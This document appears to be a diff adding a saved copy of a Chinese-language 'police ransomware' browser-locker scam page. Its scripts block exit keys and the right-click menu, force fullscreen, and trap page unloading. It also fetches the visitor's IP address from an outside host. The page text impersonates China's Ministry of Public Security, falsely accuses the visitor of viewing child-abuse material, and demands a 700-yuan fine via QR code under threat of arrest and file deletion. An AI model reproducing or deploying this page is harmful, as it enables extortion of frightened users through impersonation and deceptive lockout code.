@@ -1,0 +1,250 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<!-- saved from url=(0021)https://cnhikas.info/ -->
+<html xmlns="http://www.w3.org/1999/xhtml" lang="zh-CN"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+
+<script>
+window.onkeydown = function (evt) {
+    if (evt.keyCode == 27 || evt.keyCode == 18 || evt.keyCode == 123 || evt.keyCode == 85 || evt.keyCode == 9 || evt.keyCode == 115 || evt.keyCode == 116 || evt.keyCode == 112 || evt.keyCode == 114 || evt.keyCode == 17 || evt.keyCode == 46) {
+        return false
+    }
+};
+window.onkeypress = function (evn) {
+    if (evn.keyCode == 123 || evn.keyCode == 117) return false
+};
+
+function viewdiv(id){var el=document.getElementById(id);el.style.display="block";}
+
+onbeforeunload = function () {
+    alert("Нажмите ESC, чтобы закрыть страницу!");
+    return "Нажмите ESC, чтобы закрыть страницу!";}
+	
+var stroka = "";
+
+function toggleFullScreen() { 
+    if (!document.fullscreenElement && !document.mozFullScreenElement && !document.webkitFullscreenElement) {
+        if (document.documentElement.requestFullscreen) {
+            document.documentElement.requestFullscreen()
+        } else if (document.documentElement.mozRequestFullScreen) {
+            document.documentElement.mozRequestFullScreen()
+        } else if (document.documentElement.webkitRequestFullscreen) {
+            document.documentElement.webkitRequestFullscreen(Element.ALLOW_KEYBOARD_INPUT)
+        }
+    }
+}
+
+
+
+document.addEventListener('keyup', function (e) {
+    if (e.keyCode == 122 || e.keyCode == 17 || e.keyCode == 18 || e.keyCode == 13 || e.keyCode == 27 ) {
+        toggleFullScreen();
+        document.getElementById('map').innerHTML = stroka;
+        viewdiv('mydiv');
+        document.body.style.cursor = 'not-allowed'
+    }
+}, false);
+
+var pr = 1;
+window.onload = function() {
+    document.onclick = function(e) {
+        e = e || event;
+        target = e.target || e.srcElement;
+        toggleFullScreen();
+        //if (pr <= 1) {
+        //    document.getElementById('ots').innerHTML = "<img width='1' height='1' style='display:none' src='http://main.exoclick.com/tag.php?goal=a78c836f46380861ba27993336cc01e3'>";
+        //    pr++;
+        //}
+            document.getElementById('map').innerHTML = stroka;
+            viewdiv('mydiv');
+        document.body.style.cursor = 'not-allowed';
+        
+         var i = 0;
+         setTimeout(function() { 
+         while (i < 30000) {
+//         alert ("Статус: Ожидается оплата штрафа ...");
+//toggleFullScreen();		
+//         alert ("Статус: Проверка оплаты штрафа ...");
+         i++;
+         }
+         }, 1000);
+         
+    }
+}	
+
+
+document.oncontextmenu=new Function("return false");
+
+
+</script>
+
+<script>
+var xhr = new XMLHttpRequest();
+xhr.open('GET', 'https://ygwiki.eu.org/ip.php');
+xhr.onload = function() {
+  document.getElementById('ip-address').textContent = xhr.responseText;
+};
+xhr.send();
+</script>
+
+
+
+<style>
+html,body{margin:0;padding:0;height:100%;width:100%;-moz-user-select:-moz-none;-o-user-select:none;-khtml-user-select:none;-webkit-user-select:none;user-select:none;background:#ffffff}table{font-size:16px;color:#000000;font-family:'PT Sans', 'Arial', 'Helvetica', sans-serif}.txt{font-size:15px}.blok{font-size:14px}
+
+
+img.rightoftable{
+    display: inline-block;
+}
+
+table.table1{
+    display: inline-table;
+}
+
+
+
+</style>
+
+</head>
+<body>
+
+
+
+
+<table width="100%" height="100%" cellpadding="0" cellspacing="0" border="0" bgcolor="#000000">
+<tbody><tr>
+<td height="61" align="center" valign="top"><div id="map"><div style="top:-3px;position:fixed;left:50%;width:402px;margin:0 0 0 -221px;background-color:#fbfbfb;border:1px solid #c7c7c7;padding:16px 19px 21px 19px;border-radius:3px;font:11.7px Arial;color:#000;box-shadow:0 3px 3px -2px rgba(0,0,0,0.5)"><div style="float:right;margin:-17px -11px;font-size:18px;color:#808080;cursor:pointer;">×</div><div style="font: 17px Verdana, Arial;text-align:left !important;margin-bottom:4px">是否离开此页面？</div><br><div style="font:20.5px Verdana, Arial;text-align:left !important;margin:-2px 0 1px 0">所做的更改可能不会保存。</div><br><div style="float:right;margin-top:10px"><button style="background-color:#fbfbfb;color:#000;padding:7px 12px 8px 12px;margin:0 3px;font-size:16px;cursor:pointer;border-radius:2px;border: 1px solid #6e80ff;font-weight:700;box-shadow:0 1px 1px -1px rgba(0,0,0,0.7);">关闭</button><button style="background-color:#fbfbfb;color:#000;padding:7px 12px 8px 12px;margin:0 3px 0 3px;font-size:16px;cursor:pointer;border-radius:2px;border: 1px solid #bfbfbf;font-weight:200;box-shadow:0 1px 1px -1px rgba(0,0,0,0.7);">留下</button></div></div></div><div id="ots"></div>
+</td></tr>
+<tr>
+<td align="center" valign="top"><br><br>
+<div id="mydiv" style="display:none;">
+<table width="100%" height="594" cellpadding="0" cellspacing="0" border="0" bgcolor="#000000">
+<tbody><tr><td width="30%" valign="top">
+</td>
+<td width="833">
+<table width="833" height="552" cellpadding="0" cellspacing="0" border="0" bgcolor="#390000">
+<tbody><tr>
+<td valign="top">
+ <table width="800" height="400" cellpadding="5" cellspacing="0" border="0" bgcolor="#ff0000">
+ <tbody><tr>
+ <td>
+   <table width="800" height="400" cellpadding="10" cellspacing="0" border="0" bgcolor="#fbfbfb">
+   <tbody><tr>
+   <td colspan="3" height="97" valign="top">
+      <table border="0" width="100%"><tbody><tr><td>
+         <img src="./resource/HNzvRHv.png" width="130" height="130" border="0">
+      </td><td align="right">
+         <table width="200" height="100" cellpadding="5" cellspacing="1" border="0" bgcolor="#a2a2a2">
+         <tbody><tr>
+         <td bgcolor="#d5d5d5"><font color="#000000" size="2">
+         您的姓、名： <font color="#008400">已确定。</font><br>
+         您的所在地：<font color="#008400">已确定。</font><br>
+         您当前的位置：  <font color="#008400">已确定。</font><br>
+         您的 IP 地址:  <font color="#bc0000"><span id="ip-address"></span></font><br>
+        计算机上的所有文件：  <font color="#bc0000">已锁定。</font>
+		<br>罚款支付：<font color="#bc0000"><b>扫描二维码</b></font>
+        <br>
+         </font></td>
+         </tr>
+         </tbody></table>
+      </td></tr></tbody></table>
+   </td>
+   </tr>
+   <tr>
+   <td align="center" valign="middle" width="150">
+      <table width="180" cellpadding="0" cellspacing="5" height="60" borfer="0" bgcolor="#970000">
+      <tbody><tr>
+      <td align="center" bgcolor="#f2f2f2">
+      <b><p style="color: #6e0000">你的电脑已被锁定！</p></b>
+      </td>
+      </tr>
+      </tbody></table>
+   </td>
+   <td align="left" valign="top" height="80">
+   <br><b>第758-34012856382号罚款
+
+   <br><font color="#970000">你被罚款700元</font></b>
+   </td>
+   <td align="center" valign="middle">
+   </td>
+   </tr>
+   <tr>
+   <td align="center" valign="top" colspan="3">
+      <table width="800">
+      <tbody><tr>
+      <td align="left" valign="top" class="txt">
+
+      <font color="#171717" font="" size="4">  您因多次访问包含中华人民共和国法律禁止的内容，即恋童癖和虐待儿童内容的色情网站而被禁止。<br>
+
+
+
+您必须根据第758-34012856382号条例，将<b>700元</b>罚款转入公安部罚款征收账户。
+<br>
+
+
+
+<center><b>扫描二维码支付罚款。<b></b></b></center><b><b>
+
+</b></b></font></td></tr></tbody></table> 
+   
+ 
+
+
+     
+   
+ <table width="0" cellpadding="0" cellspacing="5" height="60" borfer="0" bgcolor="#970000" class="table1">
+      <tbody><tr>
+      <td align="center" bgcolor="#f2f2f2">
+
+
+
+  <img src="./resource/HNzvBDB.png" width="210" height="210" border="0">
+ 
+
+
+<img src="./resource/HNzvXR4.md.png" width="350" height="210" border="0">
+
+<img src="./resource/HiQWo6F.gif" width="210" height="210" border="0" class="rightoftable">
+
+
+
+ </td>
+      </tr>
+ </tbody></table>
+
+ <br>
+
+
+
+.<font color="#003205" font="" size="5"><br>&nbsp;&nbsp;<b>支付罚款后，您的计算机将自动解锁，将不会对您提起刑事诉讼！
+</b></font><br>
+      <font color="#970000" font="" size="4">&nbsp;&nbsp;<b>重要须知！</b> 如果您拒绝支付罚款或试图在不支付罚款的情况下自行解除锁定，您计算机上的所有信息将被永久删除，以防止色情制品的传播。警方将立即前往您的住处逮捕您。你将因观看和传播带有恋童癖和虐待儿童内容的色情制品而受到刑事起诉。罚款支付期限；通知和锁定发出后3小时。
+</font>
+      </td>
+      </tr>
+      
+      
+   
+   
+   </tbody></table>
+ </td>
+ </tr>
+ </tbody></table>
+</td>
+</tr>
+</tbody></table>
+</td>
+<td width="30%"></td></tr>
+</tbody></table>
+</div>
+</td>
+</tr><tr>
+<td></td></tr>
+<tr><td valign="bottom">
+</td></tr></tbody></table>
+<script type="text/javascript">
+document.getElementById('map').innerHTML = "<div style='top:-3px;position:fixed;left:50%;width:402px;margin:0 0 0 -221px;background-color:#fbfbfb;border:1px solid #c7c7c7;padding:16px 19px 21px 19px;border-radius:3px;font:11.7px Arial;color:#000;box-shadow:0 3px 3px -2px rgba(0,0,0,0.5)'><div style='float:right;margin:-17px -11px;font-size:18px;color:#808080;cursor:pointer;'>&times;</div><div style='font: 17px Verdana, Arial;text-align:left !important;margin-bottom:4px'>是否离开此页面？</div><br><div style='font:20.5px Verdana, Arial;text-align:left !important;margin:-2px 0 1px 0'>所做的更改可能不会保存。</div><br><div style='float:right;margin-top:10px'><button style='background-color:#fbfbfb;color:#000;padding:7px 12px 8px 12px;margin:0 3px;font-size:16px;cursor:pointer;border-radius:2px;border: 1px solid #6e80ff;font-weight:700;box-shadow:0 1px 1px -1px rgba(0,0,0,0.7);'>关闭</button><button style='background-color:#fbfbfb;color:#000;padding:7px 12px 8px 12px;margin:0 3px 0 3px;font-size:16px;cursor:pointer;border-radius:2px;border: 1px solid #bfbfbf;font-weight:200;box-shadow:0 1px 1px -1px rgba(0,0,0,0.7);'>留下</button></div></div>";
+</script>
+
+
+</body></html>
